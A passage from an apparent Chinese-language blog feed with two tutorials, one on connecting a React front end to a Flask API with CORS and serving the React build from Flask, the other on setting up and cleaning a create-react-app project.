operator">&lt;</span>p<span class="token operator">&gt;</span><span class="token punctuation">{</span>message <span class="token operator">||</span> <span class="token string">"Loading..."</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span>        <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><ul><li>代码解析：</li></ul><p> 这段代码是一个简单的 React 组件，它使用 axios 库从一个 Flask API 获取数据。下面是代码的逐行解释：</p><ol><li><p>import React, { useState, useEffect } from ‘react’;<br>这行代码从 react 库中导入了 React 对象、useState 钩子和 useEffect 钩子。useState 用于在函数组件中添加状态，useEffect 用于处理副作用（例如，数据获取、订阅或手动更改 React 组件中的 DOM）。</p></li><li><p>import axios from ‘axios’;<br>这行代码导入了 axios，这是一个基于 Promise 的 HTTP 客户端，用于浏览器和 node.js，用于向后端发送请求。</p></li><li><p>function App() { … }<br>定义了一个名为 App 的函数组件。</p></li><li><p>const [message, setMessage] = useState(‘’);<br>使用 useState 钩子创建了一个名为 message 的状态变量和一个名为 setMessage 的函数，用于更新这个状态。初始值设置为空字符串。</p></li><li><p>useEffect(() =&gt; { … }, []);<br>useEffect 钩子用于在组件加载后执行副作用。这里的效果是调用 Flask API 获取消息。空数组 [] 作为第二个参数表示这个效果仅在组件首次渲染时运行。</p></li><li><p>axios.get(‘<a href="http://127.0.0.1:5000/api/message">http://127.0.0.1:5000/api/message</a>‘)<br>使用 axios 发送一个 GET 请求到 <a href="http://127.0.0.1:5000/api/message">http://127.0.0.1:5000/api/message</a> 这个 URL。这个 URL 应该是你的 Flask 应用提供的 API 端点。</p></li><li><p>.then(response =&gt; setMessage(response.data.message))<br>如果请求成功，.then 方法会处理响应。这里将响应中的 message 数据赋值给状态变量 message。</p></li><li><p>.catch(error =&gt; console.error(“Error fetching data:”, error));<br>如果请求失败，.catch 方法会捕获错误，并在控制台打印错误信息。</p></li><li><p>return ( … );<br>这是 React 组件的返回语句，它定义了组件的 JSX 结构，即组件在页面上呈现的内容。</p></li><li><pre><code class="html">&lt;div style={{ textAlign: 'center', marginTop: '50px' }}&gt; ... &lt;/div&gt;<pre class="line-numbers language-none"><code class="language-none">    + 返回一个 div 元素，其中包含一些内联样式：文本居中和上边距为 50px。11. ```html    &lt;h1&gt;React + Flask 初始页面&lt;/h1&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>+ 在 div 内部，有一个标题元素 h1，显示文本 “React + Flask 初始页面”。</code></pre></li><li><pre><code class="html">&lt;p&gt;{message || "Loading..."}&lt;/p&gt;<pre class="line-numbers language-none"><code class="language-none">    + 一个段落元素 p 显示 message 状态的值。如果 message 是空的（即正在加载中），则显示 “Loading…”。      整体来看，这段代码创建了一个 React 组件，该组件在加载时从 Flask API 获取一条消息，并将其显示在页面上。如果消息尚未加载，页面将显示 “Loading…”。&lt;img src="React+Flask%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%BC%80%E5%8F%91/%E6%88%AA%E5%B1%8F2024-12-10%2009.49.10.png" alt="截屏2024-12-10 09.49.10" style="zoom:50%;" /&gt;### 4.2.3 访问测试![截屏2024-12-10 09.53.06](React+Flask%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%BC%80%E5%8F%91/%E6%88%AA%E5%B1%8F2024-12-10%2009.53.06.png)前端执行成功，但是后端的message数据请求失败。原因：同源策略限制（React端口3000，Flask端口5000）。# 五、跨域请求设置## 5.1 设置 Flask 支持跨域请求安装 Flask-CORS：```bashpip install flask-cors<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></code></pre></li></ol></blockquote><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2009.56.47.png" style="zoom:50%;"><p>修改 <code>app.py</code>：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask_cors <span class="token keyword">import</span> CORSapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>CORS<span class="token punctuation">(</span>app<span class="token punctuation">)</span>  <span class="token comment"># 允许跨域请求</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-2-测试验证"><a href="#5-2-测试验证" class="headerlink" title="5.2 测试验证"></a>5.2 测试验证</h2><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2009.59.41.png" alt="前后端联动测试成功" style="zoom:50%;"><h1 id="六、部署优化"><a href="#六、部署优化" class="headerlink" title="六、部署优化"></a>六、部署优化</h1><p><strong>开发环境</strong>：前后端分开运行。</p><p><strong>生产环境</strong>：可以使用 Flask 提供 React 构建后的静态文件。</p><h2 id="6-1-构建-React-项目"><a href="#6-1-构建-React-项目" class="headerlink" title="6.1 构建 React 项目"></a>6.1 构建 React 项目</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> run build<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>输出：</p><p>npm run build </p><blockquote><p><a href="mailto:react-frontend@0.1.0">react-frontend@0.1.0</a> build<br>react-scripts build</p></blockquote><p>Creating an optimized production build…<br>One of your dependencies, babel-preset-react-app, is importing the<br>“@babel/plugin-proposal-private-property-in-object” package without<br>declaring it in its dependencies. This is currently working because<br>“@babel/plugin-proposal-private-property-in-object” is already in your<br>node_modules folder for unrelated reasons, but it may break at any time.</p><p>babel-preset-react-app is part of the create-react-app project, which<br>is not maintianed anymore. It is thus unlikely that this bug will<br>ever be fixed. Add “@babel/plugin-proposal-private-property-in-object” to<br>your devDependencies to work around this error. This will make this message<br>go away.</p><p>Compiled successfully.</p><p>File sizes after gzip:</p><p>  73.28 kB  build/static/js/main.7d3412ba.js<br>  2.7 kB    build/static/js/488.ee97bdc1.chunk.js<br>  264 B     build/static/css/main.e6c13ad2.css</p><p>The project was built assuming it is hosted at /.<br>You can control this with the homepage field in your package.json.</p><p>The build folder is ready to be deployed.<br>You may serve it with a static server:</p><p>  npm install -g serve<br>  serve -s build</p><p>Find out more about deployment here:</p><p>  <a href="https://cra.link/deployment">https://cra.link/deployment</a></p></blockquote><h2 id="6-2-设置-Flask-提供静态文件服务"><a href="#6-2-设置-Flask-提供静态文件服务" class="headerlink" title="6.2 设置 Flask 提供静态文件服务"></a>6.2 设置 Flask 提供静态文件服务</h2><h3 id="6-2-1-将-build-文件夹复制到-Flask-项目目录"><a href="#6-2-1-将-build-文件夹复制到-Flask-项目目录" class="headerlink" title="6.2.1 将 build 文件夹复制到 Flask 项目目录"></a>6.2.1 将 <code>build</code> 文件夹复制到 Flask 项目目录</h3><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2010.06.17.png" alt="截屏2024-12-10 10.06.17" style="zoom:50%;"><p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2010.08.24.png" alt="截屏2024-12-10 10.08.24"></p><h3 id="6-2-3-设置-Flask-提供静态文件服务"><a href="#6-2-3-设置-Flask-提供静态文件服务" class="headerlink" title="6.2.3 设置 Flask 提供静态文件服务"></a>6.2.3 设置 Flask 提供静态文件服务</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> jsonify<span class="token punctuation">,</span> send_from_directory<span class="token keyword">from</span> flask_cors <span class="token keyword">import</span> CORSapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">,</span> static_folder<span class="token operator">=</span><span class="token string">'build'</span><span class="token punctuation">)</span>CORS<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">serve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> send_from_directory<span class="token punctuation">(</span>app<span class="token punctuation">.</span>static_folder<span class="token punctuation">,</span> <span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/api/message'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_message</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Hello from Flask!"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="6-2-4-访问测试"><a href="#6-2-4-访问测试" class="headerlink" title="6.2.4 访问测试"></a>6.2.4 访问测试</h3><p>启动 Flask 项目后，直接访问根路径 <code>http://127.0.0.1:5000</code>。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2010.15.20.png" style="zoom:50%;"><p>首页为空，静态资源下载失败。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2010.23.14.png" style="zoom:50%;"><h3 id="6-2-5-修改-package-json"><a href="#6-2-5-修改-package-json" class="headerlink" title="6.2.5 修改 package.json"></a>6.2.5 修改 <code>package.json</code></h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"homepage"</span><span class="token operator">:</span> <span class="token string">"."</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2010.26.43.png" alt="截屏2024-12-10 10.26.43" style="zoom:50%;"><p>重新构建项目：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> run build<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>重新测试：</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2010.28.54.png" alt="截屏2024-12-10 10.28.54" style="zoom:50%;"><p>仍然失败。</p><h3 id="6-2-6-问题进一步分析"><a href="#6-2-6-问题进一步分析" class="headerlink" title="6.2.6 问题进一步分析"></a>6.2.6 问题进一步分析</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://127.0.0.1:5000/build/static/css/main.e6c13ad2.css<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2010.31.55.png" alt="截屏2024-12-10 10.31.55" style="zoom:50%;"><p>添加build目录能够成功访问。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2010.35.37.png" style="zoom:50%;"><h3 id="6-2-7-问题解决"><a href="#6-2-7-问题解决" class="headerlink" title="6.2.7 问题解决"></a>6.2.7 问题解决</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">,</span> static_folder<span class="token operator">=</span><span class="token string">'build'</span><span class="token punctuation">,</span> static_url_path<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>添加配置：static_url_path=’’</p><h2 id="6-3-访问测试"><a href="#6-3-访问测试" class="headerlink" title="6.3 访问测试"></a>6.3 访问测试</h2><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2010.38.20.png" style="zoom:50%;"><p>至此，成功完成一个Flask+React的Demo系统。</p><p>进阶技能，后续继续加以学习。</p><h1 id="目录结构总结"><a href="#目录结构总结" class="headerlink" title="目录结构总结"></a>目录结构总结</h1><p>前端：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">react-frontend/├── public/├── src/│   ├── App.js│   ├── index.js├── package.json<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>后端：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flask-backend/├── app.py├── venv/├── build/ <span class="token punctuation">(</span>React 构建的静态文件<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 前后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前后端开发 </tag>
            
            <tag> React和Flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React前端框架</title>
      <link href="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/"/>
      <url>/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/</url>
      
        <content type="html"><![CDATA[<h1 id="一、React介绍"><a href="#一、React介绍" class="headerlink" title="一、React介绍"></a>一、React介绍</h1><h2 id="1-1-简介"><a href="#1-1-简介" class="headerlink" title="1.1 简介"></a>1.1 简介</h2><p><strong>React</strong> 是由 <strong>Meta（前 Facebook）</strong> 开发并开源的一个用于构建用户界面的 JavaScript 库，（可用于构建Web和原生交互界面）。它主要用于创建单页应用（SPA, Single Page Application），能够通过组件化的开发模式构建复杂的用户界面。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2014.23.55.png" style="zoom:30%;"><p>React 是现代前端开发中最流行的工具之一，凭借其高效的虚拟 DOM、组件化开发模式和强大的生态系统，成为构建用户界面的首选技术。无论是中小型项目还是复杂的大型应用，React 都能提供优雅的解决方案。</p><h2 id="1-2-优势"><a href="#1-2-优势" class="headerlink" title="1.2 优势"></a>1.2 优势</h2><p>相较于传统基于DOM开发的优势：</p><ol><li>组件化的开发方式</li><li>不错的性能</li></ol><p>相较于其它前端框架的优势</p><ol><li>丰富的生态</li><li>跨平台支持</li></ol><h2 id="1-3-React的市场情况"><a href="#1-3-React的市场情况" class="headerlink" title="1.3 React的市场情况"></a>1.3 React的市场情况</h2><p>全球最流行，大厂必备。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2014.25.19.png" style="zoom:20%;"><h1 id="二、开发环境搭建"><a href="#二、开发环境搭建" class="headerlink" title="二、开发环境搭建"></a>二、开发环境搭建</h1><h2 id="2-1-初始化react工程项目"><a href="#2-1-初始化react工程项目" class="headerlink" title="2.1 初始化react工程项目"></a>2.1 初始化react工程项目</h2><p>create-react-app是一个快速创建React开发环境的工具，底层由Webpack构件，封装了配置细节，开箱即用。</p><p>执行命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">npx create-react-app react-basic<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ol><li>npx -  Node.js工具命令，查找并执行后续的包命令</li><li>create-react-app - 核心包（固定写法），用于创建React项目</li><li>react-basic  React项目的名称（可以自定义）</li></ol></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> react-basic<span class="token function">npm</span> start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>bug解决：</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2014.35.02.png" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> ajv@latest ajv-keywords@latest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2014.37.21.png" style="zoom:50%;"></blockquote><p>测试：npm start</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2014.37.50.png" style="zoom:30%;"><h2 id="2-2-关键文件"><a href="#2-2-关键文件" class="headerlink" title="2.2 关键文件"></a>2.2 关键文件</h2><h3 id="2-2-1-package-json"><a href="#2-2-1-package-json" class="headerlink" title="2.2.1 package.json"></a>2.2.1 package.json</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"dependencies"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"react"</span><span class="token operator">:</span> <span class="token string">"^19.0.0"</span><span class="token punctuation">,</span>    <span class="token property">"react-dom"</span><span class="token operator">:</span> <span class="token string">"^19.0.0"</span><span class="token punctuation">,</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token property">"scripts"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"start"</span><span class="token operator">:</span> <span class="token string">"react-scripts start"</span><span class="token punctuation">,</span>    <span class="token property">"build"</span><span class="token operator">:</span> <span class="token string">"react-scripts build"</span><span class="token punctuation">,</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>react基础项目的核心依赖和核心脚本。</p><h3 id="2-2-2-src源码目录"><a href="#2-2-2-src源码目录" class="headerlink" title="2.2.2 src源码目录"></a>2.2.2 src源码目录</h3><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2014.42.22.png" style="zoom:50%;"><p>除了高亮的两个文件，其他都可以删除。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2014.44.10.png" style="zoom:50%;"><ul><li><p>index.js清理</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> React <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token punctuation">;</span><span class="token keyword">import</span> ReactDOM <span class="token keyword">from</span> <span class="token string">'react-dom/client'</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">'./index.css'</span><span class="token punctuation">;</span><span class="token keyword">import</span> App <span class="token keyword">from</span> <span class="token string">'./App'</span><span class="token punctuation">;</span><span class="token keyword">import</span> reportWebVitals <span class="token keyword">from</span> <span class="token string">'./reportWebVitals'</span><span class="token punctuation">;</span><span class="token keyword">const</span> root <span class="token operator">=</span> ReactDOM<span class="token punctuation">.</span><span class="token function">createRoot</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>root<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span>  <span class="token operator">&lt;</span>React<span class="token punctuation">.</span>StrictMode<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>App <span class="token operator">/</span><span class="token operator">&gt;</span>  <span class="token operator">&lt;</span><span class="token operator">/</span>React<span class="token punctuation">.</span>StrictMode<span class="token operator">&gt;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// If you want to start measuring performance in your app, pass a function</span><span class="token comment">// to log results (for example: reportWebVitals(console.log))</span><span class="token comment">// or send to an analytics endpoint. Learn more: https://bit.ly/CRA-vitals</span><span class="token function">reportWebVitals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>清理后：</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">import</span> React <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token punctuation">;</span><span class="token keyword">import</span> ReactDOM <span class="token keyword">from</span> <span class="token string">'react-dom/client'</span><span class="token punctuation">;</span><span class="token keyword">import</span> App <span class="token keyword">from</span> <span class="token string">'./App'</span><span class="token punctuation">;</span><span class="token keyword">const</span> root <span class="token operator">=</span> ReactDOM<span class="token punctuation">.</span><span class="token function">createRoot</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>root<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">App</span></span> <span class="token punctuation">/&gt;</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>App.js清理</p></li></ul><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">import</span> logo <span class="token keyword">from</span> <span class="token string">'./logo.svg'</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">'./App.css'</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>App<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>header</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>App-header<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>logo<span class="token punctuation">}</span></span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>App-logo<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>logo<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token plain-text">        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">          Edit </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>code</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">src/App.js</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>code</span><span class="token punctuation">&gt;</span></span><span class="token plain-text"> and save to reload.        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span>          <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>App-link<span class="token punctuation">"</span></span>          <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://reactjs.org<span class="token punctuation">"</span></span>          <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span>          <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>noopener noreferrer<span class="token punctuation">"</span></span>        <span class="token punctuation">&gt;</span></span><span class="token plain-text">          Learn React        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>header</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>清理后：</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>App<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">        This is React App.    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问测试：</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2014.50.58.png" style="zoom:50%;"><h2 id="2-3-渲染逻辑"><a href="#2-3-渲染逻辑" class="headerlink" title="2.3 渲染逻辑"></a>2.3 渲染逻辑</h2><h3 id="2-3-1-入口文件：index-js"><a href="#2-3-1-入口文件：index-js" class="headerlink" title="2.3.1 入口文件：index.js"></a>2.3.1 入口文件：index.js</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//项目的入口 从这里开始运行</span><span class="token comment">//react必要的两个核心包</span><span class="token keyword">import</span> React <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token punctuation">;</span><span class="token keyword">import</span> ReactDOM <span class="token keyword">from</span> <span class="token string">'react-dom/client'</span><span class="token punctuation">;</span><span class="token comment">//导入项目的根组件</span><span class="token keyword">import</span> App <span class="token keyword">from</span> <span class="token string">'./App'</span><span class="token punctuation">;</span><span class="token comment">//把App根组件渲染到id为root的dom节点上</span><span class="token keyword">const</span> root <span class="token operator">=</span> ReactDOM<span class="token punctuation">.</span><span class="token function">createRoot</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>root<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token operator">&lt;</span>App <span class="token operator">/</span><span class="token operator">&gt;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-3-2-id为root的dom节点"><a href="#2-3-2-id为root的dom节点" class="headerlink" title="2.3.2 id为root的dom节点"></a>2.3.2 id为root的dom节点</h3><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2014.56.13.png" style="zoom:67%;"><h3 id="2-3-3-根组件"><a href="#2-3-3-根组件" class="headerlink" title="2.3.3 根组件"></a>2.3.3 根组件</h3><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token comment">//项目的根组件</span><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token 